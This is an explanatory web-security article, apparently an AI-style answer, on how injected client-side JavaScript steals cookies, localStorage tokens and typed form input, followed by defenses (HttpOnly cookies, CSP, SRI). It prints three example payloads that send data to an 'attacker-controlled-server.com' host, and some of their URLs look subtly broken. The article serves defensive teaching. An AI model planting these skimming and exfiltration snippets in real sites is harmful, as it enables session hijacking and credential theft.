💡 The Core Concept

While JavaScript runs entirely on the client side (inside the user's browser), any compromised script in a site’s JS assets folder executes automatically within the context of the victim's browser session. If an attacker injects malicious code into a website's static JS files, they can interact with the browser's memory, DOM, and storage to steal data or hijack sessions.

🛑 How Attackers Abuse Client-Side JS


1. Session & Cookie Theft (document.cookie)

By default, client-side JavaScript can read cookies stored for the active domain. Attackers use this to exfiltrate active session IDs.
• Malicious Payload Concept:javascript
// Silently sends the victim's cookies to an attacker-controlled server via an image request
new Image().src = "https://attacker-controlled-server.com" + encodeURIComponent(document.cookie);

2. Token Extraction (localStorage / sessionStorage)

Modern web applications often store Authentication Tokens (like JWTs) in local or session storage. JavaScript has unrestricted access to these APIs.
• Malicious Payload Concept:javascript
// Dumps all localStorage data and transmits it via a background fetch request
fetch("https://attacker-controlled-server.com", {
  method: "POST",
  body: JSON.stringify(localStorage)
});

3. Form Jacking & Keylogging

Attackers can hook into DOM input events to steal credentials or credit card numbers in real-time as the user types them, long before the form is sent to the legitimate server.
• Malicious Payload Concept:javascript
// Captures everything typed into input fields on the page
document.querySelectorAll('input').forEach(input => {
  input.addEventListener('change', (e) => {
    fetch(`https://attacker-controlled-server.com{e.target.name}&val=${e.target.value}`);
  });
});

🛡️ Critical Defenses & Mitigation Steps

To safeguard your web applications against these vectors, implement these industry-standard security controls:

1. Enforce HttpOnly Cookies (Primary Defense)

When setting session or authentication cookies from your backend, always append the HttpOnly and Secure flags. This tells the browser to completely block client-side JavaScript from reading the cookie value.
• Example HTTP Response Header:http
Set-Cookie: session_token=xyz123abc; Secure; HttpOnly; SameSite=Strict;

2. Implement Content Security Policy (CSP)

A robust CSP header prevents unauthorized scripts from executing and blocks malicious scripts from exfiltrating data to external, untrusted servers.
• Example Nginx Configuration Header:nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self' https://trusted-cdn.com; connect-src 'self';";
Use code with caution.
(This configuration ensures that scripts can only be loaded from your own domain or a trusted CDN, and data can only be sent back to your server).

3. Use Subresource Integrity (SRI)

If you must load third-party JavaScript libraries (e.g., from a CDN), use SRI hashes to ensure the browser instantly rejects the file if it has been modified or tampered with on the vendor's side.
• Example HTML Implementation:html
<script src="https://jquery.com" 
        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" 
        crossorigin="anonymous"></script>
